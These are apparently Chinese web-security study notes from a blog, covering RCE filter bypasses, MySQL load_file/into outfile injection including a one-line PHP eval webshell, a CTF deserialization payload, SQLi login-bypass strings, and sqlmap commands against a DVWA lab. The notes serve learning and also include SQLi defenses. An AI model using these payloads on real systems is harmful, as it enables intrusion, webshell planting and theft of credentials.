<p>IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）<br>具体操作<br>用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。<br>来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……<br>实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。</p>
<hr>
<p>​       <strong>第四：使用burp suite时浏览器的代理设置。</strong></p>
<p><strong>1.火狐浏览器安装插件</strong></p>
<h1 id="FoxyProxy-标准版"><a href="#FoxyProxy-标准版" class="headerlink" title="FoxyProxy 标准版"></a>FoxyProxy 标准版</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370687313-39151ef7-4f02-4207-b095-7bc7f2a593f8.png" alt="img"></p>
<p>2.Edge浏览器安装插件</p>
<h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370760581-fdf5355f-64a6-4b92-afdc-51d4c5a7198a.png" alt="img"></p>
<p>什么时候用就打开。</p>
<ul>
<li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
</ul>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结五</title>
    <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
    <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
<span id="more"></span>

<h5 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h5><p>适用条件:过滤了字符串<br>放在shell命令中，绕过正则匹配且不影响原意</p>
<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
<h5 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a>读文件绕过(cat绕过)</h5><p>适用条件:过滤了cat<br>1)more:一页一页的显示档案内容<br>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(5)tail:查看尾几行<br>(6)nl：显示的时候，顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器，这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体内容<br>grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<h5 id="linux通配符绕过"><a href="#linux通配符绕过" class="headerlink" title="linux通配符绕过"></a>linux通配符绕过</h5><p>适用条件:过滤了flag，没有过滤 ? *<br>在linux系统中 有一些通配符</p>
<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结八</title>
    <url>/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/</url>
    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><h2 id="Mysql注入中load-file-与select-into-outfile命令"><a href="#Mysql注入中load-file-与select-into-outfile命令" class="headerlink" title="Mysql注入中load_file()与select into outfile命令"></a>Mysql注入中load_file()与select into outfile命令</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>查看某个文件的内容</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
<span id="more"></span>

<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
<p>我们构造**$id**为：</p>
<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
<p>我们的查询语句就变成：</p>
<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
<p>所以上面的语句就变成：</p>
<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
<p>2、能够使用union （需要mysql 3以上的版本）</p>
<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
<p>后天条件需要二个：</p>
<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
<h4 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h4><p>mysql的load_file()常见的用法：</p>
<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
<p>而无法查看到代码。</p>
<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
<p>apache文件。</p>
<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
<p>14、/etc/my.cnf Mysql的配置文件</p>
<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
<h3 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h3><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
<p><strong>其中，into outfile的使用前提是：</strong></p>
<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
<p>2.要有file权限，默认情况下只有root权限有</p>
<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
<p>1.直接写进文件里</p>
<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
<p>2.修改文件结尾</p>
<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
<p>查版本号</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
<h2 id="一道反序列化"><a href="#一道反序列化" class="headerlink" title="一道反序列化"></a>一道反序列化</h2><p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670059317609-fcb0c167-5a82-4039-9a87-7fafc8dfa89f.png" alt="img"></p>
<p>打开一看啥也没有，看看源码</p>
<p>根据以上源码泄露，是文件包含漏洞，配合封装协议读取文件源码<br>包含了class.php文件。<br>这里得讲到file_get_contents()函数<br>file_get_contents() 函数把整个文件读入一个字符串中。<br>这里的字符串是$user参数接受的，利用它的文件封装协议来读取$file参数include的文件<br>当然这里要使第一个条件成立。还需要讲到一个文件封装协议<br>php://input 是个可以访问请求的原始数据的只读流<br>第一个条件：<br>if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”))<br>使$user的值等于admin，并且使$user接收读入的文件<br>可利用php://input绕过</p>
<p>成功绕过<br>现在利用php伪协议读取class.php源码，格式为base64加密</p>
<p>我们构造反序列化的参数：O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}<br>这里也是利用php://filter来读取flag文件</p>
<p>base64解密后</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670059338208-69950874-ac17-49a4-9527-12fa0dcbcdc0.png" alt="img"></p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670059842048-877fe8d0-29d2-4f0e-a0e3-d1b65ec48073.png" alt="img"></p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670059938564-c4bd1ee4-9791-4770-95c5-00d768345a27.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString was called!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们构造反序列化的参数：<br>O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}</p>
<p>这里也是利用php://filter来读取flag文件</p>
<p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670060263796-9ff717b3-9e0c-4029-9cd4-cacfcb72b556.png" alt="img"></p>
<p>解密后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="comment">//flag&#123;hSh_ctf:e@syt0g3t&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结六</title>
    <url>/2022/10/30/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AD/</url>
    <content><![CDATA[<h1 id="一、学习内容"><a href="#一、学习内容" class="headerlink" title="一、学习内容"></a>一、学习内容</h1><h2 id="1-1dirsearch下载及使用"><a href="#1-1dirsearch下载及使用" class="headerlink" title="1.1dirsearch下载及使用"></a>1.1dirsearch下载及使用</h2><pre><code> GitHub的下载地址为：https://github.com/maurosoria/dirsearch
</code></pre>
<span id="more"></span>

<h3 id="1-1-1命令"><a href="#1-1-1命令" class="headerlink" title="1.1.1命令"></a>1.1.1命令</h3><p>使用python.exe dirsearch.py -h可以查看到各种命令。</p>
<p>常用：dirsearch.py -u ip地址 -e </p>
<p>​        -u 指定url</p>
<p>-e 指定网站语言</p>
<p>-w 可以加上自己的字典（带上路径）</p>
<p>例如：<img src="/2022/10/30/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AD/1667099409732-133558e3-d66c-4106-b770-e558db773eef.png" alt="img"></p>
<h2 id="1-2修改请求头为本地访问"><a href="#1-2修改请求头为本地访问" class="headerlink" title="1.2修改请求头为本地访问"></a>1.2修改请求头为本地访问</h2><p>X-Forward-For：127.0.0.1</p>
<p>Referer：127.0.0.1</p>
<h2 id="1-3xss漏洞"><a href="#1-3xss漏洞" class="headerlink" title="1.3xss漏洞"></a>1.3xss漏洞</h2><p>在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为<script>alert('1')</script>可以得到xss漏洞，没有过滤，拿下xss。</p>
<h2 id="1-4端口号对应服务"><a href="#1-4端口号对应服务" class="headerlink" title="1.4端口号对应服务"></a>1.4端口号对应服务</h2><p>HTTP                                             80</p>
<p>​        HTTPS                                            443</p>
<p>​        Telnet                                             23</p>
<p>​        FTP                                             221</p>
<p>​        SSH（远程登录）SCP（文件传输），端口重定向     22</p>
<p>​        SMTP                                            25</p>
<p>​         POP3                                            110</p>
<p>​        WebLogic                                        7001</p>
<p>​        TOMCAT                                        8080</p>
<p>​        WIN2003远程登录                                3389</p>
<p>​        Oracle数据库                                    1521</p>
<p>​        MS SQL*SEVER数据库sever                        1433</p>
<p>​        MySQL数据库sever                                3306</p>
<h2 id="2-1掌握php弱类型比较"><a href="#2-1掌握php弱类型比较" class="headerlink" title="2.1掌握php弱类型比较"></a>2.1掌握php弱类型比较</h2><h3 id="2-1-1php中其中两种比较符号"><a href="#2-1-1php中其中两种比较符号" class="headerlink" title="2.1.1php中其中两种比较符号:"></a>2.1.1php中其中两种比较符号:</h3><p>==：先将字符串类型转化成相同，再比较<br>===：先判断两种字符串的类型是否相等，再比较字符串和数字比较使用==时,字符串会先转换为数字类型再比较<br>var_dump(‘a’ == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0。<br>var_dump(‘123a’ == 123);//true，这里’123a’会被转换为123。</p>
<p>var_dump(‘a123’ == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。<br>举例：<br>var_dump(‘123a1’ == 123);//true<br>var_dump(‘1233a’ == 123);//false<br>&lt;、&gt;、&lt;=、&gt;=都存在和==相同的弱类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">$a=@$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=@$_GET[&#x27;b&#x27;];</span><br><span class="line">if($a==0 and $a)&#123;</span><br><span class="line">    echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric($b))&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">if($b&gt;1234)&#123;</span><br><span class="line">    echo $flag2;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>(1)这里包含了config.php<br>(2)url接收参数a和b的值<br>(3)如果$a等于0 and <img src="https://g.yuque.com/gr/latex?a%EF%BC%8C%E8%BE%93%E5%87%BA" alt="img">flag1<br>(4)如果<img src="https://g.yuque.com/gr/latex?b%E6%98%AF%E6%95%B0%E5%AD%97%E6%88%96%E8%80%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%82%A3%E4%B9%88%E9%80%80%E5%87%BA%E5%BD%93%E5%89%8D%E8%84%9A%E6%9C%AC%0A(5)%E5%A6%82%E6%9E%9C" alt="img">b&gt;1234，输出$flag2</p>
<p>if(true and true){ //这里$a==0 and $a，==为弱类型比较，字符串开头都为0，所以0==0 and ‘b’，因为字符串b存在，所以and后面也为true，所以双true，最后if括号里为true，执行if下面的语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric(2222a))&#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">if(2222a&gt;1234)&#123;</span><br><span class="line">echo $flag2;</span><br></pre></td></tr></table></figure>

<h2 id="3-1sql手工注入"><a href="#3-1sql手工注入" class="headerlink" title="3.1sql手工注入"></a>3.1sql手工注入</h2><h3 id="3-1-1万能密码"><a href="#3-1-1万能密码" class="headerlink" title="3.1.1万能密码"></a>3.1.1万能密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/*</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1--</span><br></pre></td></tr></table></figure>

<h3 id="3-1-2mysql常见名称"><a href="#3-1-2mysql常见名称" class="headerlink" title="3.1.2mysql常见名称"></a>3.1.2mysql常见名称</h3><p>schema_name　　储存了所有数据库的库名<br>tables　　        储存了数据库库名，以及该库中包含的表名<br>table_schema　   储存了数据库名<br>table_name　　   储存了表名</p>
<h3 id="3-1-3手工注入命令"><a href="#3-1-3手工注入命令" class="headerlink" title="3.1.3手工注入命令"></a>3.1.3手工注入命令</h3><p>爆表<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>爆列<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’dvwa’#</p>
<h3 id="3-1-4有回显的手工SQL注入步骤"><a href="#3-1-4有回显的手工SQL注入步骤" class="headerlink" title="3.1.4有回显的手工SQL注入步骤"></a>3.1.4有回显的手工SQL注入步骤</h3><p>mysql的注释可以是#或者– ，注意–后面有空格，可以写成– ss这样比较不容易漏掉空格。此外如果在url中用#要进行url编码，写为%23。</p>
<p>1、找注入点</p>
<p>2、找闭合，常见的有单引号、双引号（字符型），无闭合（数值型）</p>
<p>确定</p>
<p>3、确定列数 order by</p>
<p>4、确定字段类型 union select</p>
<p>5、爆库  union select 1,database()</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;</span><br><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761   （0x64767761是dvwa的ascii码）</span><br></pre></td></tr></table></figure>



<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;</span><br><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(user),group_concat(password) from users</span><br></pre></td></tr></table></figure>

<h2 id="3-2sqlmap注入"><a href="#3-2sqlmap注入" class="headerlink" title="3.2sqlmap注入"></a>3.2sqlmap注入</h2><p>1、如果是post型，可以先burpsuite抓包保存为txt</p>
<p>2、找注入点（可以省略）</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4”     （GET型，如果需要认证身份要加cookie）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt”           （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a>          （POST型，输入和回显不在同一个页面)</p>
<p>3、爆库</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” -dbs           （GET型，全部可访问的数据库）</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –current-db         （GET型，当前数据库）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –current-db              （POST型，当前数据库）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –current-db     （POST型，输入和回显不在同一个页面，当前数据库）</p>
<p>4、爆表</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –tables -D dvwa    （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –tables -D dvwa       （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –tables -D dvwa         （POST型，输入和回显不在同一个页面)</p>
<p>5、爆列</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –columns -D dvwa -T users    （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –columns -D dvwa -T users     （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –columns -D dvwa -T users     （POST型，输入和回显不在同一个页面)</p>
<p>6、爆内容</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –dump -D dvwa -T users -C “user,password”     （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –dump -D dvwa -T users -C “user,password”     （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –dump -D dvwa -T users -C “user,password”     （POST型，输入和回显不在同一个页面)</p>
<h2 id="3-3SQL注入防御"><a href="#3-3SQL注入防御" class="headerlink" title="3.3SQL注入防御"></a>3.3SQL注入防御</h2><p>SQL注入形成的原因是数据和代码没分离，用户可控的数据可以作为SQL语句执行。</p>
<p>因此防御sql注入最有效的方法是使用预编译语句，就像IMPOSSIBLE关这样。</p>
<p>预编译之后输入的参数不会再进行SQL编译，SQL语句的语义不会发生变化。</p>
<p>除此之外，也可以采用安全的存储过程，但存储过程本身可能存在注入；检查输入的数据类型也是有用的，但不是万能的；使用安全函数，注意数据库的最小权限原则也是有利的。</p>
<h2 id="4-1php正则匹配"><a href="#4-1php正则匹配" class="headerlink" title="4.1php正则匹配"></a>4.1php正则匹配</h2><p>元字符：</p>
<p>\d    匹配任意一个0-9的数字</p>
<p>\D    匹配任意一个除十进制数以外的字符，等价于[^0-9]</p>
<p>\s    匹配任意一个空白的字符，比如换页符、换行符、回车符号、制表符、垂直制表符</p>
<p>\S    匹配出空白字符以外的所有字符</p>
<p>\w    匹配任意一个数字或字母或下划线</p>
